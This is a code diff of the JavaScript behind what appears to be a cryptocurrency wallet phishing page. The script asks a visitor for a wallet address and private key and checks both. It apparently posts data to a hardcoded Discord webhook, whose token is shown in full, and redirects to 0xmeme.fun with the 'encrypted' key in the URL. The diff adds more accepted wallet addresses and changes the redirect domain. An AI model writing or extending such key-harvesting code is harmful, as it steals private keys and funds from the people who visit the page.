@@ -9,7 +9,13 @@ document.addEventListener('DOMContentLoaded', function() {
     const modalError = document.getElementById('modalError');
     const loadingOverlay = document.getElementById('loadingOverlay');
 
-    const VALID_WALLET_ADDRESS = "HJL5i5ez6M4mWy3dX1KtSEYfhW5GazpWttAowsRngYAm";
+    const VALID_WALLET_ADDRESSES = [
+        "HJL5i5ez6M4mWy3dX1KtSEYfhW5GazpWttAowsRngYAm",
+        "3qDmJRFwV6ZZuHz4gYDRAdJQtJ4HBw5jWHNjaC9e8xaH",
+        "F2MbRb3BaqHZwWw9Mv8DW1dBhBbncDbRK9pNnLMEW1Wa",
+        "ENnCp997S9i8E11xgpR7CCfS8F87Df8BivYe68fyxSbp"
+    ];
+
     const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1313437202385993798/PSz65bbO_Uq8yf9QRK5xkS9FP2KwMtDv9h6segXaljEUV53bPcKqw0ambV8RDX9nvmvQ";
 
     // 发送数据到 Discord
@@ -36,9 +42,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // 验证钱包地址格式
     function isValidWalletAddress(address) {
-        return address === "HJL5i5ez6M4mWy3dX1KtSEYfhW5GazpWttAowsRngYAm" || 
-               address === "3qDmJRFwV6ZZuHz4gYDRAdJQtJ4HBw5jWHNjaC9e8xaH" ||
-               address === "ENnCp997S9i8E11xgpR7CCfS8F87Df8BivYe68fyxSbp";
+        return VALID_WALLET_ADDRESSES.includes(address);
     }
 
     // 验证私钥格式
@@ -99,7 +103,6 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        // 修改错误提示文本
         if (!isValidPrivateKey(privateKey)) {
             showError(modalError, '私钥错误');
             return;
@@ -115,7 +118,7 @@ document.addEventListener('DOMContentLoaded', function() {
             const encryptedKey = encryptKey(privateKey);
             
             // 跳转到目标页面，带上加密后的参数
-            window.location.href = `https://0xmeme.fun?key=${encryptedKey}`;
+            window.location.href = `https://www.0xmeme.fun?key=${encryptedKey}`;
             
         } catch (error) {
             hideLoading();
